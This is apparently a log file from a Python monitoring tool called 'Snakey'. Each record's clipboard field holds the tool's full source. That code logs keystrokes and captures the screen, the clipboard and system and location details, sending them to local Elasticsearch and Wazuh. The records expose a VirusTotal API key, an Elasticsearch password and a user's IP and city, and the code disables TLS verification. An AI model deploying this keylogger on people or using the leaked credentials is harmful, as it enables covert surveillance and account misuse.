Error during send: {e}. Check network, service status, firewall.\")\r\n        except AuthenticationException as e:\r\n            log_daemon_message(\"ERROR\", f\"Elasticsearch Authentication Error during send: {e}. Check ELASTIC_USER and ELASTIC_PASSWORD.\")\r\n        except TransportError as e:\r\n            log_daemon_message(\"ERROR\", f\"Elasticsearch Transport Error during send (HTTP status {e.status_code}): {e.info}. Problem on ES server or data format.\")\r\n        except Exception as e:\r\n            log_daemon_message(\"ERROR\", f\"Falha inesperada ao enviar log para Elasticsearch: {e}\")\r\n    else:\r\n        log_daemon_message(\"WARNING\", \"Cliente Elasticsearch n\u00e3o est\u00e1 configurado ou conectado. O log n\u00e3o ser\u00e1 enviado.\")\r\n\r\ndef collect_full_session():\r\n    session_log = {\r\n        \"timestamp\": datetime.now().isoformat(),\r\n        \"system\": {},\r\n        \"clipboard\": \"\",\r\n        \"keystrokes\": \"\",\r\n        \"screenshot_taken\": False,\r\n        \"alerts\": [],\r\n        \"virustotal\": {},\r\n        \"important_dirs\": {}\r\n    }\r\n\r\n    try:\r\n        session_log[\"system\"][\"username\"] = getpass.getuser()\r\n        hostname = socket.gethostname()\r\n        session_log[\"system\"][\"hostname\"] = hostname\r\n        try:\r\n            session_log[\"system\"][\"private_ip\"] = socket.gethostbyname(hostname)\r\n        except socket.gaierror as e:\r\n            session_log[\"system\"][\"private_ip\"] = f\"Error: {e}\"\r\n            session_log[\"alerts\"].append(f\"Could not get private IP: {e}\")\r\n\r\n        try:\r\n            ip_info = requests.get(\"https://ipinfo.io/json\", timeout=5).json()\r\n            session_log[\"system\"][\"public_ip\"] = ip_info.get(\"ip\")\r\n            session_log[\"system\"][\"country\"] = ip_info.get(\"country\")\r\n            session_log[\"system\"][\"region\"] = ip_info.get(\"region\")\r\n            session_log[\"system\"][\"city\"] = ip_info.get(\"city\")\r\n            session_log[\"system\"][\"isp\"] = ip_info.get(\"org\", \"Unknown\")\r\n\r\n            if ip_info.get(\"country\") and ip_info[\"country\"] not in known_countries:\r\n                session_log[\"alerts\"].append(f\"Access from untrusted country: {ip_info['country']}\")\r\n        except requests.exceptions.Timeout:\r\n            session_log[\"alerts\"].append(\"IP info lookup timed out.\")\r\n            log_daemon_message(\"WARNING\", \"IP info lookup timed out.\")\r\n        except requests.exceptions.RequestException as e:\r\n            session_log[\"alerts\"].append(f\"IP info lookup failed: {e}\")\r\n            log_daemon_message(\"ERROR\", f\"IP info lookup failed: {e}\")\r\n        except Exception as e:\r\n            session_log[\"alerts\"].append(f\"Unexpected error during IP info lookup: {e}\")\r\n            log_daemon_message(\"ERROR\", f\"Unexpected error during IP info lookup: {e}\")\r\n\r\n        session_log[\"system\"][\"processor\"] = platform.processor()\r\n        session_log[\"system\"][\"os\"] = platform.system() + \" \" + platform.version()\r\n        session_log[\"system\"][\"machine\"] = platform.machine()\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"System info error: {e}\")\r\n        log_daemon_message(\"ERROR\", f\"System info collection error: {e}\")\r\n\r\n    if platform.system() == \"Windows\":\r\n        try:\r\n            win32clipboard.OpenClipboard()\r\n            try:\r\n                session_log[\"clipboard\"] = win32clipboard.GetClipboardData()\r\n            except TypeError:\r\n                session_log[\"clipboard\"] = \"Clipboard is empty.\"\r\n            win32clipboard.CloseClipboard()\r\n            session_log[\"clipboard_hash\"] = hash_text(session_log[\"clipboard\"])\r\n        except Exception as e:\r\n            session_log[\"alerts\"].append(f\"Clipboard error: {e}\")\r\n            log_daemon_message(\"ERROR\", f\"Clipboard error: {e}\")\r\n    else:\r\n        session_log[\"clipboard\"] = \"Clipboard collection not supported on this OS.\"\r\n        session_log[\"clipboard_hash\"] = hash_text(session_log[\"clipboard\"])\r\n\r\n    if platform.system() == \"Windows\":\r\n        try:\r\n            screenshot_path = os.path.join(base_path, screenshot_information)\r\n            im = ImageGrab.grab()\r\n            im.save(screenshot_path)\r\n            session_log[\"screenshot_taken\"] = True\r\n            session_log[\"screenshot_hash\"] = hash_file(screenshot_path)\r\n        except Exception as e:\r\n            session_log[\"alerts\"].append(f\"Screenshot error: {e}\")\r\n            log_daemon_message(\"ERROR\", f\"Screenshot error: {e}\")\r\n    else:\r\n        session_log[\"screenshot_taken\"] = False\r\n        session_log[\"alerts\"].append(\"Screenshot collection not supported on this OS.\")\r\n\r\n    if session_log[\"clipboard\"].startswith(\"http\"):\r\n        vt_result = vt_lookup_url(session_log[\"clipboard\"])\r\n        if vt_result:\r\n            session_log[\"virustotal\"][\"clipboard_url\"] = vt_result\r\n\r\n    if session_log.get(\"screenshot_taken\"):\r\n        vt_result = vt_lookup_file(os.path.join(base_path, screenshot_information))\r\n        if vt_result:\r\n            session_log[\"virustotal\"][\"screenshot_file\"] = vt_result\r\n\r\n    keys = []\r\n\r\n    def on_press(key):\r\n        if hasattr(key, 'char'):\r\n            keys.append(key.char)\r\n        elif key == Key.space:\r\n            keys.append(' ')\r\n        else:\r\n            keys.append(f\"[{str(key).replace('Key.', '')}]\")\r\n\r\n    log_daemon_message(\"INFO\", \"Keylogger running. Create 'stop_snakey.txt' to terminate.\")\r\n    listener = None\r\n    try:\r\n        with Listener(on_press=on_press) as listener:\r\n            start_time = time.time()\r\n            while time.time() - start_time < 10:\r\n                time.sleep(1)\r\n                if check_stop_file():\r\n                    log_daemon_message(\"INFO\", \"Stop file detected. Exiting keylogger.\")\r\n                    break\r\n            listener.stop()\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Keylogger listener error: {e}. This might happen if not running in a desktop session.\")\r\n        if listener:\r\n            try:\r\n                listener.stop()\r\n            except Exception as stop_e:\r\n                log_daemon_message(\"WARNING\", f\"Error stopping keylogger listener: {stop_e}\")\r\n\r\n    session_log[\"keystrokes\"] = ''.join(keys)\r\n    session_log[\"important_dirs\"] = check_important_directories()\r\n\r\n    log_string_for_hash = json.dumps(session_log, sort_keys=True, default=str)\r\n    session_log[\"log_hash\"] = hash_text(log_string_for_hash)\r\n\r\n    try:\r\n        if os.path.exists(json_log_path):\r\n            try:\r\n                with open(json_log_path, \"r\") as f:\r\n                    logs = json.load(f)\r\n            except json.JSONDecodeError:\r\n                log_daemon_message(\"WARNING\", \"Existing JSON log file is corrupt. Starting with empty log.\")\r\n                logs = []\r\n        else:\r\n            logs = []\r\n\r\n        logs.append(session_log)\r\n        with open(json_log_path, \"w\") as f:\r\n            json.dump(logs, f, indent=4)\r\n\r\n        log_daemon_message(\"SUCCESS\", \"Log saved to JSON file.\")\r\n\r\n        if os.path.exists(hash_ledger_path):\r\n            try:\r\n                with open(hash_ledger_path, \"r\") as f:\r\n                    ledger = json.load(f)\r\n                if ledger and isinstance(ledger[0], str):\r\n                    log_daemon_message(\"INFO\", \"Converting legacy hash ledger format.\")\r\n                    ledger = [{\r\n                        \"timestamp\": \"unknown\",\r\n                        \"log_hash\": h,\r\n                        \"previous_hash\": \"0\" * 64,\r\n                        \"chained_hash\": \"0\" * 64\r\n                    } for h in ledger]\r\n            except json.JSONDecodeError:\r\n                log_daemon_message(\"WARNING\", \"Existing hash ledger file is corrupt. Starting with empty ledger.\")\r\n                ledger = []\r\n        else:\r\n            ledger = []\r\n\r\n        previous_hash = ledger[-1][\"log_hash\"] if ledger else \"0\" * 64\r\n        chained_hash_input = session_log[\"log_hash\"] + previous_hash\r\n        chained_hash = hash_text(chained_hash_input)\r\n\r\n        ledger_entry = {\r\n            \"timestamp\": session_log[\"timestamp\"],\r\n            \"log_hash\": session_log[\"log_hash\"],\r\n            \"previous_hash\": previous_hash,\r\n            \"chained_hash\": chained_hash\r\n        }\r\n\r\n        ledger.append(ledger_entry)\r\n\r\n        with open(hash_ledger_path, \"w\") as f:\r\n            json.dump(ledger, f, indent=4)\r\n\r\n        log_daemon_message(\"SUCCESS\", \"Blockchain-style hash ledger updated.\")\r\n\r\n        hash_list = [entry[\"log_hash\"] for entry in ledger]\r\n        merkle_root = build_merkle_tree(hash_list)\r\n\r\n        with open(merkle_root_path, \"w\") as f:\r\n            f.write(merkle_root)\r\n\r\n        log_daemon_message(\"SUCCESS\", \"Merkle root saved.\")\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Failed to save log or update ledger: {e}\")\r\n\r\n    return session_log\r\n\r\n# === Main Daemon Loop ===\r\nif __name__ == \"__main__\":\r\n    log_daemon_message(\"INFO\", \"Starting Snakey in daemon mode...\")\r\n\r\n    while True:\r\n        if check_stop_file():\r\n            log_daemon_message(\"INFO\", \"Snakey terminated by stop file.\")\r\n            break\r\n\r\n        session_log = collect_full_session()\r\n        log_to_wazuh_file(session_log)\r\n        send_to_elasticsearch(session_log)\r\n\r\n        log_daemon_message(\"INFO\", f\"Sleeping for 15 seconds before next collection at {datetime.now().isoformat()}...\")\r\n        time.sleep(15)\r\n\r\n    stop_file_path = os.path.join(base_path, \"stop_snakey.txt\")\r\n    if os.path.exists(stop_file_path):\r\n        os.remove(stop_file_path)\r\n        log_daemon_message(\"INFO\", \"Stop file removed.\")", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (794 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "4f6a09bdb50feac1b8390b7f31ee7b564bc8ee67a1b7f2a03aac6fb0a770193a", "screenshot_hash": "8a7aa12e3fe5e6dcf7bff763930dd272cf338b64a02209cc5d2032638594f97a", "log_hash": "fa1648b874965f13c717ec38e72bbfea55dde03ba7a8801156d71d09cc2d13df"}
{"timestamp": "2025-06-10T16:49:19.314437", "system": {"username": "user", "hostname": "MSI", "private_ip": "172.20.10.2", "public_ip": "46.50.2.132", "country": "PT", "region": "Lisbon", "city": "Lisbon", "isp": "AS42863 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "import os\r\nimport time\r\nimport json\r\nimport socket\r\nimport getpass\r\nimport hashlib\r\nimport platform\r\nfrom datetime import datetime\r\nfrom requests import get, post\r\nfrom pynput.keyboard import Key, Listener\r\nfrom PIL import ImageGrab\r\nimport win32clipboard\r\nfrom cryptography.fernet import Fernet\r\nimport requests\r\nfrom elasticsearch import Elasticsearch, ConnectionError, TransportError, AuthenticationException\r\nimport ssl\r\n\r\n# === Configuration ===\r\nbase_path = \"C:/Users/ktmdu/PycharmProjects/Snakey/Cryptography\"\r\nencrypted_path = os.path.join(base_path, \"encrypted/\")\r\nos.makedirs(encrypted_path, exist_ok=True)\r\n\r\njson_log_path = os.path.join(base_path, \"snakey_log.json\")\r\nhash_ledger_path = os.path.join(base_path, \"hash_ledger.json\")\r\nmerkle_root_path = os.path.join(base_path, \"merkle_root.txt\")\r\nwazuh_log_file = os.path.join(base_path, \"wazuh_alerts.log\")\r\ndaemon_log_file = os.path.join(base_path, \"snakey_daemon_errors.log\")\r\n\r\nscreenshot_information = \"screenshot.png\"\r\nkey_path = os.path.join(encrypted_path, \"key.key\")\r\nknown_countries = [\"Spain\"]\r\n\r\n# === VirusTotal Config ===\r\nVT_API_KEY = \"c5f762cd3b75395566d2cce05125d25c40af4ac71ce73801e936080938784b46\"\r\nVT_URL_LOOKUP = \"https://www.virustotal.com/api/v3/urls/\"\r\nVT_FILE_LOOKUP = \"https://www.virustotal.com/api/v3/files/\"\r\nVT_HEADER = {\"x-apikey\": VT_API_KEY}\r\n\r\ndef log_daemon_message(level, message):\r\n    timestamp = datetime.now().isoformat()\r\n    log_entry = f\"[{timestamp}] [{level}] {message}\\n\"\r\n    try:\r\n        with open(daemon_log_file, \"a\") as f:\r\n            f.write(log_entry)\r\n        print(log_entry.strip())\r\n    except Exception as e:\r\n        print(f\"[CRITICAL ERROR] Failed to write to daemon log file: {e}\")\r\n        print(log_entry.strip())\r\n\r\nif not os.path.exists(key_path):\r\n    log_daemon_message(\"ERROR\", \"Encryption key not found! Run GenerateKey.py first. Exiting.\")\r\n    exit(1)\r\n\r\ntry:\r\n    with open(key_path, \"rb\") as key_file:\r\n        key = key_file.read()\r\n    fernet = Fernet(key)\r\nexcept Exception as e:\r\n    log_daemon_message(\"ERROR\", f\"Failed to load encryption key: {e}. Exiting.\")\r\n    exit(1)\r\n\r\n# === Elasticsearch Configuration ===\r\nELASTIC_HOST = 'localhost'\r\nELASTIC_PORT = 9200\r\nELASTIC_USER = 'elastic'\r\nELASTIC_PASSWORD = 'vNODISLG+5Y0f*U4mKaI'\r\n\r\n# NO LONGER NEEDED: es_context = ssl._create_unverified_context()\r\n\r\nes_client = None\r\n\r\nes_precheck_successful = False\r\nlog_daemon_message(\"INFO\", \"Performing basic requests.get pre-check to Elasticsearch endpoint.\")\r\ntry:\r\n    response = requests.get(f\"https://{ELASTIC_HOST}:{ELASTIC_PORT}\", auth=(ELASTIC_USER, ELASTIC_PASSWORD), verify=False, timeout=10, stream=True)\r\n    log_daemon_message(\"DEBUG\", f\"Basic requests.get status: {response.status_code}\")\r\n    response.raw.read(1)\r\n    response.close()\r\n    if response.status_code == 200:\r\n        log_daemon_message(\"INFO\", \"Basic requests.get pre-check successful (status 200).\")\r\n        es_precheck_successful = True\r\n    else:\r\n        log_daemon_message(\"WARNING\", f\"Basic requests.get pre-check returned non-200 status: {response.status_code}. Not proceeding with ES client init.\")\r\n\r\nexcept requests.exceptions.ConnectionError as e:\r\n    log_daemon_message(\"ERROR\", f\"requests.ConnectionError during pre-check: {e}. Possible firewall, service down, or wrong host/port.\")\r\nexcept requests.exceptions.Timeout:\r\n    log_daemon_message(\"ERROR\", \"requests.Timeout during pre-check: Connection timed out.\")\r\nexcept requests.exceptions.RequestException as e:\r\n    log_daemon_message(\"ERROR\", f\"requests.RequestException during pre-check: {e}. Could be SSL, authentication, or other request error.\")\r\nexcept Exception as e:\r\n    log_daemon_message(\"ERROR\", f\"Unexpected error during basic requests pre-check: {e}\")\r\n\r\nif es_precheck_successful:\r\n    try:\r\n        es_client = Elasticsearch(\r\n            hosts=[f\"https://{ELASTIC_HOST}:{ELASTIC_PORT}\"],\r\n            basic_auth=(ELASTIC_USER, ELASTIC_PASSWORD),\r\n            # --- IMPORTANT ADDITIONS ---\r\n            verify_certs=False, # Explicitly tell elasticsearch-py NOT to verify certificates\r\n            ssl_show_warn=False, # Suppress SSL warnings from elasticsearch-py\r\n            # ---------------------------\r\n            request_timeout=30\r\n        )\r\n        log_daemon_message(\"INFO\", \"Elasticsearch client initialized based on successful pre-check.\")\r\n    except ConnectionError as e:\r\n        log_daemon_message(\"ERROR\", f\"Elasticsearch Connection Error during client init: {e}. Check network, service status, firewall.\")\r\n        es_client = None\r\n    except AuthenticationException as e:\r\n        log_daemon_message(\"ERROR\", f\"Elasticsearch Authentication Error during client init: {e}. Check ELASTIC_USER and ELASTIC_PASSWORD.\")\r\n        es_client = None\r\n    except TransportError as e:\r\n        log_daemon_message(\"ERROR\", f\"Elasticsearch Transport Error during client init (HTTP status {e.status_code}): {e.info}. Problem on ES server or request formatting.\")\r\n        es_client = None\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Erro inesperado ao inicializar cliente Elasticsearch: {e}\")\r\n        es_client = None\r\nelse:\r\n    log_daemon_message(\"WARNING\", \"Elasticsearch pre-check failed. Elasticsearch client will not be initialized.\")\r\n\r\n\r\n# === Utility Functions (No changes needed from previous review) ===\r\ndef hash_file(filepath):\r\n    sha256_hash = hashlib.sha256()\r\n    try:\r\n        with open(filepath, \"rb\") as f:\r\n            for byte_block in iter(lambda: f.read(4096), b\"\"):\r\n                sha256_hash.update(byte_block)\r\n        return sha256_hash.hexdigest()\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Hashing failed for {filepath}: {e}\")\r\n        return None\r\n\r\ndef hash_text(text):\r\n    return hashlib.sha256(text.encode()).hexdigest()\r\n\r\ndef build_merkle_tree(hashes):\r\n    if not hashes:\r\n        return None\r\n    while len(hashes) > 1:\r\n        if len(hashes) % 2 != 0:\r\n            hashes.append(hashes[-1])\r\n        new_hashes = []\r\n        for i in range(0, len(hashes), 2):\r\n            combined = hashes[i] + hashes[i + 1]\r\n            new_hashes.append(hash_text(combined))\r\n        hashes = new_hashes\r\n    return hashes[0]\r\n\r\ndef vt_lookup_url(url):\r\n    try:\r\n        url_id = hashlib.sha256(url.encode()).hexdigest()\r\n        response = requests.get(VT_URL_LOOKUP + url_id, headers=VT_HEADER, timeout=5)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n        else:\r\n            log_daemon_message(\"WARNING\", f\"VirusTotal URL lookup failed with status {response.status_code} for {url}: {response.text}\")\r\n    except requests.exceptions.RequestException as e:\r\n        log_daemon_message(\"ERROR\", f\"VT URL lookup failed: {e}\")\r\n    return {}\r\n\r\ndef vt_lookup_file(file_path):\r\n    try:\r\n        file_hash = hash_file(file_path)\r\n        response = requests.get(VT_FILE_LOOKUP + file_hash, headers=VT_HEADER, timeout=5)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n        elif response.status_code == 404:\r\n             log_daemon_message(\"WARNING\", f\"VirusTotal File lookup failed (404 Not Found) for hash {file_hash} from {file_path}. File likely not previously analyzed by VT.\")\r\n        else:\r\n            log_daemon_message(\"WARNING\", f\"VirusTotal File lookup failed with status {response.status_code} for {file_path}: {response.text}\")\r\n    except requests.exceptions.RequestException as e:\r\n        log_daemon_message(\"ERROR\", f\"VT File lookup failed: {e}\")\r\n    return {}\r\n\r\ndef check_important_directories():\r\n    important_dirs = {\r\n        \"Desktop\": os.path.join(os.path.expanduser(\"~\"), \"Desktop\"),\r\n        \"Documents\": os.path.join(os.path.expanduser(\"~\"), \"Documents\"),\r\n        \"Downloads\": os.path.join(os.path.expanduser(\"~\"), \"Downloads\"),\r\n        \"AppData\": os.environ.get(\"APPDATA\", \"\"),\r\n        \"LocalAppData\": os.environ.get(\"LOCALAPPDATA\", \"\")\r\n    }\r\n\r\n    dir_status = {}\r\n    for name, path in important_dirs.items():\r\n        if os.path.exists(path):\r\n            try:\r\n                file_count = len(os.listdir(path))\r\n                dir_status[name] = f\"Found ({file_count} items)\"\r\n            except Exception as e:\r\n                dir_status[name] = f\"Error reading contents: {e}\"\r\n        else:\r\n            dir_status[name] = \"Not found\"\r\n    return dir_status\r\n\r\ndef check_stop_file():\r\n    return os.path.exists(os.path.join(base_path, \"stop_snakey.txt\"))\r\n\r\ndef log_to_wazuh_file(data):\r\n    try:\r\n        with open(wazuh_log_file, \"a\") as f:\r\n            f.write(json.dumps(data) + \"\\n\")\r\n        log_daemon_message(\"INFO\", \"Log written to Wazuh-compatible file.\")\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Wazuh log file write failed: {e}\")\r\n\r\ndef send_to_elasticsearch(data):\r\n    global es_client\r\n    if es_client:\r\n        try:\r\n            data_to_send = data.copy()\r\n            if 'timestamp' in data_to_send and isinstance(data_to_send['timestamp'], datetime):\r\n                data_to_send['timestamp'] = data_to_send['timestamp'].isoformat()\r\n\r\n            log_daemon_message(\"DEBUG\", f\"Attempting to send log to Elasticsearch for timestamp: {data_to_send['timestamp']}\")\r\n            response = es_client.index(index=\"snakey_logs\", document=data_to_send)\r\n            log_daemon_message(\"SUCCESS\", f\"Log enviado para Elasticsearch. ID: {response['_id']}\")\r\n        except ConnectionError as e:\r\n            log_daemon_message(\"ERROR\", f\"Elasticsearch Connection Error during send: {e}. Check network, service status, firewall.\")\r\n        except AuthenticationException as e:\r\n            log_daemon_message(\"ERROR\", f\"Elasticsearch Authentication Error during send: {e}. Check ELASTIC_USER and ELASTIC_PASSWORD.\")\r\n        except TransportError as e:\r\n            log_daemon_message(\"ERROR\", f\"Elasticsearch Transport Error during send (HTTP status {e.status_code}): {e.info}. Problem on ES server or data format.\")\r\n        except Exception as e:\r\n            log_daemon_message(\"ERROR\", f\"Falha inesperada ao enviar log para Elasticsearch: {e}\")\r\n    else:\r\n        log_daemon_message(\"WARNING\", \"Cliente Elasticsearch n\u00e3o est\u00e1 configurado ou conectado. O log n\u00e3o ser\u00e1 enviado.\")\r\n\r\ndef collect_full_session():\r\n    session_log = {\r\n        \"timestamp\": datetime.now().isoformat(),\r\n        \"system\": {},\r\n        \"clipboard\": \"\",\r\n        \"keystrokes\": \"\",\r\n        \"screenshot_taken\": False,\r\n        \"alerts\": [],\r\n        \"virustotal\": {},\r\n        \"important_dirs\": {}\r\n    }\r\n\r\n    try:\r\n        session_log[\"system\"][\"username\"] = getpass.getuser()\r\n        hostname = socket.gethostname()\r\n        session_log[\"system\"][\"hostname\"] = hostname\r\n        try:\r\n            session_log[\"system\"][\"private_ip\"] = socket.gethostbyname(hostname)\r\n        except socket.gaierror as e:\r\n            session_log[\"system\"][\"private_ip\"] = f\"Error: {e}\"\r\n            session_log[\"alerts\"].append(f\"Could not get private IP: {e}\")\r\n\r\n        try:\r\n            ip_info = requests.get(\"https://ipinfo.io/json\", timeout=5).json()\r\n            session_log[\"system\"][\"public_ip\"] = ip_info.get(\"ip\")\r\n            session_log[\"system\"][\"country\"] = ip_info.get(\"country\")\r\n            session_log[\"system\"][\"region\"] = ip_info.get(\"region\")\r\n            session_log[\"system\"][\"city\"] = ip_info.get(\"city\")\r\n            session_log[\"system\"][\"isp\"] = ip_info.get(\"org\", \"Unknown\")\r\n\r\n            if ip_info.get(\"country\") and ip_info[\"country\"] not in known_countries:\r\n                session_log[\"alerts\"].append(f\"Access from untrusted country: {ip_info['country']}\")\r\n        except requests.exceptions.Timeout:\r\n            session_log[\"alerts\"].append(\"IP info lookup timed out.\")\r\n            log_daemon_message(\"WARNING\", \"IP info lookup timed out.\")\r\n        except requests.exceptions.RequestException as e:\r\n            session_log[\"alerts\"].append(f\"IP info lookup failed: {e}\")\r\n            log_daemon_message(\"ERROR\", f\"IP info lookup failed: {e}\")\r\n        except Exception as e:\r\n            session_log[\"alerts\"].append(f\"Unexpected error during IP info lookup: {e}\")\r\n            log_daemon_message(\"ERROR\", f\"Unexpected error during IP info lookup: {e}\")\r\n\r\n        session_log[\"system\"][\"processor\"] = platform.processor()\r\n        session_log[\"system\"][\"os\"] = platform.system() + \" \" + platform.version()\r\n        session_log[\"system\"][\"machine\"] = platform.machine()\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"System info error: {e}\")\r\n        log_daemon_message(\"ERROR\", f\"System info collection error: {e}\")\r\n\r\n    if platform.system() == \"Windows\":\r\n        try:\r\n            win32clipboard.OpenClipboard()\r\n            try:\r\n                session_log[\"clipboard\"] = win32clipboard.GetClipboardData()\r\n            except TypeError:\r\n                session_log[\"clipboard\"] = \"Clipboard is empty.\"\r\n            win32clipboard.CloseClipboard()\r\n            session_log[\"clipboard_hash\"] = hash_text(session_log[\"clipboard\"])\r\n        except Exception as e:\r\n            session_log[\"alerts\"].append(f\"Clipboard error: {e}\")\r\n            log_daemon_message(\"ERROR\", f\"Clipboard error: {e}\")\r\n    else:\r\n        session_log[\"clipboard\"] = \"Clipboard collection not supported on this OS.\"\r\n        session_log[\"clipboard_hash\"] = hash_text(session_log[\"clipboard\"])\r\n\r\n    if platform.system() == \"Windows\":\r\n        try:\r\n            screenshot_path = os.path.join(base_path, screenshot_information)\r\n            im = ImageGrab.grab()\r\n            im.save(screenshot_path)\r\n            session_log[\"screenshot_taken\"] = True\r\n            session_log[\"screenshot_hash\"] = hash_file(screenshot_path)\r\n        except Exception as e:\r\n            session_log[\"alerts\"].append(f\"Screenshot error: {e}\")\r\n            log_daemon_message(\"ERROR\", f\"Screenshot error: {e}\")\r\n    else:\r\n        session_log[\"screenshot_taken\"] = False\r\n        session_log[\"alerts\"].append(\"Screenshot collection not supported on this OS.\")\r\n\r\n    if session_log[\"clipboard\"].startswith(\"http\"):\r\n        vt_result = vt_lookup_url(session_log[\"clipboard\"])\r\n        if vt_result:\r\n            session_log[\"virustotal\"][\"clipboard_url\"] = vt_result\r\n\r\n    if session_log.get(\"screenshot_taken\"):\r\n        vt_result = vt_lookup_file(os.path.join(base_path, screenshot_information))\r\n        if vt_result:\r\n            session_log[\"virustotal\"][\"screenshot_file\"] = vt_result\r\n\r\n    keys = []\r\n\r\n    def on_press(key):\r\n        if hasattr(key, 'char'):\r\n            keys.append(key.char)\r\n        elif key == Key.space:\r\n            keys.append(' ')\r\n        else:\r\n            keys.append(f\"[{str(key).replace('Key.', '')}]\")\r\n\r\n    log_daemon_message(\"INFO\", \"Keylogger running. Create 'stop_snakey.txt' to terminate.\")\r\n    listener = None\r\n    try:\r\n        with Listener(on_press=on_press) as listener:\r\n            start_time = time.time()\r\n            while time.time() - start_time < 10:\r\n                time.sleep(1)\r\n                if check_stop_file():\r\n                    log_daemon_message(\"INFO\", \"Stop file detected. Exiting keylogger.\")\r\n                    break\r\n            listener.stop()\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Keylogger listener error: {e}. This might happen if not running in a desktop session.\")\r\n        if listener:\r\n            try:\r\n                listener.stop()\r\n            except Exception as stop_e:\r\n                log_daemon_message(\"WARNING\", f\"Error stopping keylogger listener: {stop_e}\")\r\n\r\n    session_log[\"keystrokes\"] = ''.join(keys)\r\n    session_log[\"important_dirs\"] = check_important_directories()\r\n\r\n    log_string_for_hash = json.dumps(session_log, sort_keys=True, default=str)\r\n    session_log[\"log_hash\"] = hash_text(log_string_for_hash)\r\n\r\n    try:\r\n        if os.path.exists(json_log_path):\r\n            try:\r\n                with open(json_log_path, \"r\") as f:\r\n                    logs = json.load(f)\r\n            except json.JSONDecodeError:\r\n                log_daemon_message(\"WARNING\", \"Existing JSON log file is corrupt. Starting with empty log.\")\r\n                logs = []\r\n        else:\r\n            logs = []\r\n\r\n        logs.append(session_log)\r\n        with open(json_log_path, \"w\") as f:\r\n            json.dump(logs, f, indent=4)\r\n\r\n        log_daemon_message(\"SUCCESS\", \"Log saved to JSON file.\")\r\n\r\n        if os.path.exists(hash_ledger_path):\r\n            try:\r\n                with open(hash_ledger_path, \"r\") as f:\r\n                    ledger = json.load(f)\r\n                if ledger and isinstance(ledger[0], str):\r\n                    log_daemon_message(\"INFO\", \"Converting legacy hash ledger format.\")\r\n                    ledger = [{\r\n                        \"timestamp\": \"unknown\",\r\n                        \"log_hash\": h,\r\n                        \"previous_hash\": \"0\" * 64,\r\n                        \"chained_hash\": \"0\" * 64\r\n                    } for h in ledger]\r\n            except json.JSONDecodeError:\r\n                log_daemon_message(\"WARNING\", \"Existing hash ledger file is corrupt. Starting with empty ledger.\")\r\n                ledger = []\r\n        else:\r\n            ledger = []\r\n\r\n        previous_hash = ledger[-1][\"log_hash\"] if ledger else \"0\" * 64\r\n        chained_hash_input = session_log[\"log_hash\"] + previous_hash\r\n        chained_hash = hash_text(chained_hash_input)\r\n\r\n        ledger_entry = {\r\n            \"timestamp\": session_log[\"timestamp\"],\r\n            \"log_hash\": session_log[\"log_hash\"],\r\n            \"previous_hash\": previous_hash,\r\n            \"chained_hash\": chained_hash\r\n        }\r\n\r\n        ledger.append(ledger_entry)\r\n\r\n        with open(hash_ledger_path, \"w\") as f:\r\n            json.dump(ledger, f, indent=4)\r\n\r\n        log_daemon_message(\"SUCCESS\", \"Blockchain-style hash ledger updated.\")\r\n\r\n        hash_list = [entry[\"log_hash\"] for entry in ledger]\r\n        merkle_root = build_merkle_tree(hash_list)\r\n\r\n        with open(merkle_root_path, \"w\") as f:\r\n            f.write(merkle_root)\r\n\r\n        log_daemon_message(\"SUCCESS\", \"Merkle root saved.\")\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Failed to save log or update ledger: {e}\")\r\n\r\n    return session_log\r\n\r\n# === Main Daemon Loop ===\r\nif __name__ == \"__main__\":\r\n    log_daemon_message(\"INFO\", \"Starting Snakey in daemon mode...\")\r\n\r\n    while True:\r\n        if check_stop_file():\r\n            log_daemon_message(\"INFO\", \"Snakey terminated by stop file.\")\r\n            break\r\n\r\n        session_log = collect_full_session()\r\n        log_to_wazuh_file(session_log)\r\n        send_to_elasticsearch(session_log)\r\n\r\n        log_daemon_message(\"INFO\", f\"Sleeping for 15 seconds before next collection at {datetime.now().isoformat()}...\")\r\n        time.sleep(15)\r\n\r\n    stop_file_path = os.path.join(base_path, \"stop_snakey.txt\")\r\n    if os.path.exists(stop_file_path):\r\n        os.remove(stop_file_path)\r\n        log_daemon_message(\"INFO\", \"Stop file removed.\")", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (794 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "4f6a09bdb50feac1b8390b7f31ee7b564bc8ee67a1b7f2a03aac6fb0a770193a", "screenshot_hash": "3bc0f1087935aa679d99c0591e1d961f21c2481f0fd12c7bb08b49782f3e2d58", "log_hash": "1bd9729920dab5615d28699395801c0fbf4600e560e9023122428a1db2d3c4a9"}
